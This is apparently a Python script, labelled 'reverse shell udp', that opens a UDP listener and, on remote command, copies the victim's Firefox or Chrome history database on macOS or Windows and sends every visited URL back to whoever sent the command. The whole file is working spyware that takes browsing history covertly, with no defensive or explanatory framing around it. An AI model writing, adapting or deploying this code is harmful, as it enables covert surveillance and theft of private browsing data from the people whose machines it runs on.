# reverse shell udp
import sqlite3 as sql
import os
from shutil import copy
from tempfile import gettempdir
from pathlib import Path
from socket import *

FF_DB_PLACES = 'places.sqlite'
CHR_DB_PLACES = 'History'
PORT = 5432


# ---- init server
def init_server():
    server = socket(AF_INET, SOCK_DGRAM)
    server.bind(('', PORT))
    print('Hello, I''m alive...')

    while True:

        s_data, client = server.recvfrom(1024)
        print(f'Received command : {s_data.decode("utf-8")}')

        if s_data == b'ff_url\n':
            db = ff_copy_places()
            for url in ff_get_urls(db):
                server.sendto(bytes(url+'\n', 'utf-8'), client)

        if s_data == b'chr_url\n':
            db = chr_copy_places()
            for url in chr_get_urls(db):
                server.sendto(bytes(url+'\n', 'utf-8'), client)

        if s_data == b'quit\n':
            break

    server.close()


# ---- gets name of profile of current user
def ff_get_profile():

    mstat = 0
    profile = ''

    for root, dirs, files in os.walk(ff_get_profile_dir()):
        if FF_DB_PLACES in files:
            if os.stat(os.path.join(root, FF_DB_PLACES)).st_mtime > mstat:
                profile = root
    return profile


# ---- gets Firefox profiles directory
def ff_get_profile_dir():

    home = str(Path.home())

    if os.sys.platform == 'darwin':
        return f'{home}/Library/Application Support/Firefox/Profiles'
    elif os.sys.platform == 'win32':
        return f'{home}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles'


# ----
def ff_copy_places():

    tmp_dir = gettempdir()
    copy(f'{ff_get_profile()}/{FF_DB_PLACES}', tmp_dir)
    return f'{tmp_dir}/{FF_DB_PLACES}'


# ----
def chr_copy_places():

    tmp_dir = gettempdir()

    if os.sys.platform == 'darwin':
        location = 'Library/Application Support/Google/Chrome/Default'
    elif os.sys.platform == 'win32':
        location = 'AppData\\Local\\Google\\Chrome\\User Data\\Default'

    copy(f'{str(Path.home())}/{location}/{CHR_DB_PLACES}', tmp_dir)
    return f'{tmp_dir}/{CHR_DB_PLACES}'


# ---
def ff_get_urls(db_places):

    conn = sql.connect(db_places)
    cursor = conn.cursor()
    cursor.execute('select url from moz_places')
    s_url = set()

    for url in cursor.fetchall():
        s_url.add(url[0])

    cursor.close()
    conn.close()
    return s_url


# ---
def chr_get_urls(db_places):

    conn = sql.connect(db_places)
    cursor = conn.cursor()
    cursor.execute('select url from urls')
    s_url = set()

    for url in cursor.fetchall():
        s_url.add(url[0])

    cursor.close()
    conn.close()
    return s_url


# ---- main
if __name__ == '__main__':
    init_server()
